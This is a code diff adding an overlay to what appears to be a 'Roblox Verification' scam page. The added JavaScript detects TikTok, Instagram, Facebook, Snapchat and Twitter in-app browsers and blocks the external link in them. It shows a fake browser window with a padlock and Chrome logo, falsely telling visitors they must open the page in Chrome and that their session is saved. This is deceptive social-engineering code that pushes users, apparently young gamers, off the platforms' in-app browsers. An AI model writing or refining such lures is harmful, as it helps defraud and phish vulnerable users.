@@ -1375,6 +1375,305 @@
         }
 
         /* ============================================================
+           NEW: BROWSER EDUCATION OVERLAY
+           ============================================================ */
+        .browser-edu-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 100000;
+            background: rgba(5, 7, 13, 0.88);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s ease;
+        }
+        .browser-edu-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .browser-edu-window {
+            width: 100%;
+            max-width: 460px;
+            background: #1a2332;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow:
+                0 0 0 1px rgba(255,255,255,0.08),
+                0 40px 100px -20px rgba(0,0,0,0.9),
+                0 0 60px rgba(59,130,246,0.15);
+            transform: translateY(20px) scale(0.94);
+            transition: transform 0.45s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .browser-edu-overlay.show .browser-edu-window {
+            transform: translateY(0) scale(1);
+        }
+
+        .browser-edu-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            background: linear-gradient(180deg, #2d3748 0%, #1a2332 100%);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .browser-edu-dots {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+            width: 60px;
+        }
+        .browser-edu-dots .dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f57; }
+        .dot-yellow { background: #febc2e; }
+        .dot-green { background: #28c840; }
+
+        .browser-edu-tab {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #1a2332;
+            padding: 6px 10px;
+            border-radius: 6px 6px 0 0;
+            font-size: 11px;
+            color: #cbd5e1;
+            font-weight: 500;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            min-width: 0;
+        }
+        .browser-edu-tab span {
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .browser-edu-addressbar {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 10px;
+            background: #1a2332;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .browser-edu-addressbar .nav-btn {
+            width: 24px;
+            height: 24px;
+            border-radius: 6px;
+            background: transparent;
+            border: none;
+            color: #94a3b8;
+            font-size: 11px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: background 0.15s;
+        }
+        .browser-edu-addressbar .nav-btn:hover {
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+        }
+        .browser-edu-address {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,0,0,0.4);
+            padding: 6px 10px;
+            border-radius: 7px;
+            font-size: 12px;
+            color: #e2e8f0;
+            overflow: hidden;
+            white-space: nowrap;
+            min-width: 0;
+        }
+        .browser-edu-address i {
+            color: #4ade80;
+            font-size: 9px;
+            flex-shrink: 0;
+        }
+        .browser-edu-address span {
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .browser-edu-content {
+            padding: 24px 20px 22px;
+            background: #0f172a;
+            text-align: center;
+        }
+
+        .browser-edu-chrome-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+            filter: drop-shadow(0 6px 16px rgba(59,130,246,0.4));
+            animation: floatLogo 3s ease-in-out infinite;
+        }
+        @keyframes floatLogo {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+
+        .browser-edu-title {
+            font-family: "Space Grotesk", sans-serif;
+            font-size: 19px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.01em;
+            margin-bottom: 8px;
+        }
+
+        .browser-edu-desc {
+            font-size: 12.5px;
+            color: #94a3b8;
+            line-height: 1.6;
+            margin-bottom: 18px;
+            padding: 0 6px;
+        }
+        .browser-edu-desc strong {
+            color: #cbd5e1;
+            font-weight: 600;
+        }
+
+        .browser-edu-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .browser-edu-step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.07);
+            border-radius: 10px;
+            font-size: 12.5px;
+            color: #cbd5e1;
+        }
+
+        .browser-edu-step .step-num {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #3b82f6, #6366f1);
+            color: #fff;
+            font-size: 10px;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .browser-edu-step .step-txt {
+            line-height: 1.4;
+            min-width: 0;
+        }
+        .browser-edu-step .step-txt strong {
+            color: #fff;
+            font-weight: 700;
+        }
+        .browser-edu-step i {
+            font-size: 10px;
+            opacity: 0.7;
+        }
+
+        .browser-edu-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .browser-edu-btn {
+            flex: 1;
+            padding: 12px 14px;
+            font-family: "Space Grotesk", sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            transition: all 0.2s ease;
+            letter-spacing: -0.005em;
+            font-family: "Space Grotesk", sans-serif;
+        }
+
+        .browser-edu-btn i { font-size: 11px; }
+
+        .browser-edu-btn-copy {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.12);
+            color: #e2e8f0;
+        }
+        .browser-edu-btn-copy:hover {
+            background: rgba(255,255,255,0.12);
+            border-color: rgba(255,255,255,0.2);
+        }
+        .browser-edu-btn-copy.copied {
+            background: rgba(34,197,94,0.18);
+            border-color: rgba(34,197,94,0.5);
+            color: #86efac;
+        }
+
+        .browser-edu-btn-continue {
+            background: linear-gradient(135deg, #3b82f6 0%, #6366f1 100%);
+            color: #fff;
+            box-shadow: 0 8px 24px -8px rgba(59,130,246,0.6);
+        }
+        .browser-edu-btn-continue:hover {
+            transform: translateY(-1.5px);
+            box-shadow: 0 12px 30px -8px rgba(59,130,246,0.8);
+        }
+        .browser-edu-btn-continue:active {
+            transform: translateY(0);
+        }
+
+        .browser-edu-hint {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 10.5px;
+            color: #64748b;
+            margin-top: 14px;
+        }
+        .browser-edu-hint i {
+            color: #22c55e;
+            font-size: 9px;
+        }
+
+        @media (max-width: 480px) {
+            .browser-edu-overlay { padding: 12px; }
+            .browser-edu-window { max-width: 100%; }
+            .browser-edu-content { padding: 20px 16px; }
+            .browser-edu-title { font-size: 17px; }
+            .browser-edu-desc { font-size: 12px; }
+            .browser-edu-step { font-size: 12px; padding: 9px 11px; }
+            .browser-edu-btn { font-size: 12px; padding: 11px 10px; }
+            .browser-edu-actions { flex-direction: column; }
+        }
+
+        /* ============================================================
            RESPONSIVE — Mobile first
            ============================================================ */
 
@@ -1801,6 +2100,97 @@
             <div class="redirect-tip">
                 <i class="fa-solid fa-lock"></i>
                 <span>Secure connection · Do not close this window</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         NEW: BROWSER EDUCATION OVERLAY
+         (appears only when user is in TikTok/IG/FB in-app browser)
+         ============================================================ -->
+    <div class="browser-edu-overlay" id="browserEduOverlay">
+        <div class="browser-edu-window">
+
+            <!-- Window title bar -->
+            <div class="browser-edu-titlebar">
+                <div class="browser-edu-dots">
+                    <span class="dot dot-red"></span>
+                    <span class="dot dot-yellow"></span>
+                    <span class="dot dot-green"></span>
+                </div>
+                <div class="browser-edu-tab">
+                    <i class="fa-solid fa-lock" style="font-size:9px;opacity:0.6;"></i>
+                    <span>Roblox Verification</span>
+                </div>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <!-- Address bar -->
+            <div class="browser-edu-addressbar">
+                <button class="nav-btn" type="button"><i class="fa-solid fa-chevron-left"></i></button>
+                <button class="nav-btn" type="button"><i class="fa-solid fa-chevron-right"></i></button>
+                <button class="nav-btn" type="button"><i class="fa-solid fa-rotate-right"></i></button>
+                <div class="browser-edu-address">
+                    <i class="fa-solid fa-lock"></i>
+                    <span id="browserEduUrl">external-link.com</span>
+                </div>
+                <button class="nav-btn" type="button"><i class="fa-solid fa-ellipsis-vertical"></i></button>
+            </div>
+
+            <!-- Page content -->
+            <div class="browser-edu-content">
+
+                <div class="browser-edu-chrome-logo">
+                    <svg viewBox="0 0 48 48" width="56" height="56" aria-hidden="true">
+                        <circle cx="24" cy="24" r="23" fill="#ffffff"/>
+                        <path d="M24 4 A20 20 0 0 1 41.3 14 L33.5 20.5 A10 10 0 0 0 24 14 Z" fill="#EA4335"/>
+                        <path d="M41.3 14 A20 20 0 0 1 41.3 34 L33.5 27.5 A10 10 0 0 0 33.5 20.5 Z" fill="#FBBC05"/>
+                        <path d="M41.3 34 A20 20 0 0 1 24 44 L24 33 A10 10 0 0 0 33.5 27.5 Z" fill="#34A853"/>
+                        <path d="M24 44 A20 20 0 0 1 6.7 34 L14.5 27.5 A10 10 0 0 0 24 33 Z" fill="#34A853"/>
+                        <path d="M6.7 34 A20 20 0 0 1 6.7 14 L14.5 20.5 A10 10 0 0 0 14.5 27.5 Z" fill="#EA4335"/>
+                        <path d="M6.7 14 A20 20 0 0 1 24 4 L24 14 A10 10 0 0 0 14.5 20.5 Z" fill="#EA4335"/>
+                        <circle cx="24" cy="24" r="9" fill="#4285F4"/>
+                        <circle cx="24" cy="24" r="3.8" fill="#ffffff"/>
+                    </svg>
+                </div>
+
+                <h2 class="browser-edu-title">Open in Google Chrome</h2>
+                <p class="browser-edu-desc">
+                    You're viewing this page in <strong id="browserEduName">TikTok</strong>'s built-in browser.
+                    To complete verification, you must open this page in <strong>Google Chrome</strong>.
+                </p>
+
+                <div class="browser-edu-steps">
+                    <div class="browser-edu-step">
+                        <span class="step-num">1</span>
+                        <span class="step-txt">Tap the <i class="fa-solid fa-ellipsis"></i> menu at the top</span>
+                    </div>
+                    <div class="browser-edu-step">
+                        <span class="step-num">2</span>
+                        <span class="step-txt">Select <strong>Open in browser</strong></span>
+                    </div>
+                    <div class="browser-edu-step">
+                        <span class="step-num">3</span>
+                        <span class="step-txt">Choose <strong>Chrome</strong> from the list</span>
+                    </div>
+                </div>
+
+                <div class="browser-edu-actions">
+                    <button class="browser-edu-btn browser-edu-btn-copy" id="browserEduCopy" type="button">
+                        <i class="fa-solid fa-copy"></i>
+                        <span>Copy link</span>
+                    </button>
+                    <button class="browser-edu-btn browser-edu-btn-continue" id="browserEduContinue" type="button">
+                        <i class="fa-solid fa-check"></i>
+                        <span>Continue in Chrome</span>
+                    </button>
+                </div>
+
+                <p class="browser-edu-hint">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    Your session is saved automatically.
+                </p>
+
             </div>
         </div>
     </div>
@@ -2456,7 +2846,102 @@
             updateUsernameUI();
 
         })();
+
+        /* ============================================================
+           NEW: BROWSER EDUCATION — TikTok / IG / FB in-app browser
+           ============================================================ */
+        (function () {
+            var browserEduOverlay = document.getElementById("browserEduOverlay");
+            var browserEduCopy    = document.getElementById("browserEduCopy");
+            var browserEduContinue= document.getElementById("browserEduContinue");
+            var browserEduName    = document.getElementById("browserEduName");
+            var browserEduUrl     = document.getElementById("browserEduUrl");
+            var extBtn            = document.getElementById("externalBtn");
+
+            var skipBrowserEdu = false;
+
+            /* Detect in-app browsers (TikTok / Instagram / Facebook / Snapchat / Twitter) */
+            function detectInAppBrowser() {
+                var ua = navigator.userAgent || "";
+                if (/ByteLocale|TikTok|BytedanceWebview|musical_ly|trill_/i.test(ua)) return "TikTok";
+                if (/Instagram/i.test(ua)) return "Instagram";
+                if (/FBAN|FBAV|FB_IAB|FB4A/i.test(ua)) return "Facebook";
+                if (/Snapchat/i.test(ua)) return "Snapchat";
+                if (/Twitter/i.test(ua) && !/Chrome|Safari|CriOS/i.test(ua)) return "Twitter";
+                return null;
+            }
+
+            /* Show the actual external URL (trimmed) in the mock address bar */
+            function setAddressUrl() {
+                var href = extBtn.getAttribute("href") || "";
+                var display = href.replace(/^https?:\/\//i, "");
+                if (display.length > 42) display = display.slice(0, 42) + "…";
+                browserEduUrl.textContent = display || "external-link.com";
+            }
+            setAddressUrl();
+
+            /* Intercept the external button click (capture phase) */
+            document.addEventListener("click", function (e) {
+                var target = e.target;
+                if (!(target === extBtn || (extBtn && extBtn.contains(target)))) return;
+                if (skipBrowserEdu) return;
+
+                var app = detectInAppBrowser();
+                if (app) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    if (browserEduName) browserEduName.textContent = app;
+                    setAddressUrl();
+                    browserEduOverlay.classList.add("show");
+                }
+            }, true);
+
+            /* Copy link */
+            if (browserEduCopy) {
+                browserEduCopy.addEventListener("click", function () {
+                    var url = extBtn.getAttribute("href") || "";
+                    function done() {
+                        browserEduCopy.classList.add("copied");
+                        var lbl = browserEduCopy.querySelector("span");
+                        if (lbl) lbl.textContent = "Copied!";
+                        setTimeout(function () {
+                            browserEduCopy.classList.remove("copied");
+                            if (lbl) lbl.textContent = "Copy link";
+                        }, 2200);
+                    }
+                    function fallback() {
+                        try {
+                            var ta = document.createElement("textarea");
+                            ta.value = url;
+                            ta.style.position = "fixed";
+                            ta.style.opacity = "0";
+                            document.body.appendChild(ta);
+                            ta.select();
+                            document.execCommand("copy");
+                            document.body.removeChild(ta);
+                            done();
+                        } catch (err) { /* silent */ }
+                    }
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        navigator.clipboard.writeText(url).then(done).catch(fallback);
+                    } else {
+                        fallback();
+                    }
+                });
+            }
+
+            /* Continue in Chrome → proceeds with the original redirect flow */
+            if (browserEduContinue) {
+                browserEduContinue.addEventListener("click", function () {
+                    browserEduOverlay.classList.remove("show");
+                    skipBrowserEdu = true;
+                    setTimeout(function () {
+                        if (extBtn) extBtn.click();
+                    }, 350);
+                });
+            }
+        })();
     </script>
 
 </body>
-</html>
+                            </html>
